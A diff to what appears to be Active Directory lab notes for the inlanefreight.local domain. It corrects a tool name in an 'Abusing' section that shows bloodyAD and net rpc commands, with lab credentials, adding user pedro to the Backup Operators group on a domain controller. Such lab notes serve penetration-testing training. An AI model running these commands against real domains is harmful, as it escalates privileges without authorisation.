@@ -54,7 +54,7 @@ Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs | ?{$_.SecurityId
 
 ### Abusing
 ```bash
-loodyAD -d inlanefreight.local -u pedro -p SecuringAD01 --dc-ip 10.129.205.81 add groupMember 'Backup Operators' pedro
+bloodyAD -d inlanefreight.local -u pedro -p SecuringAD01 --dc-ip 10.129.205.81 add groupMember 'Backup Operators' pedro
 
 net rpc group members 'Backup Operators' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
 ```
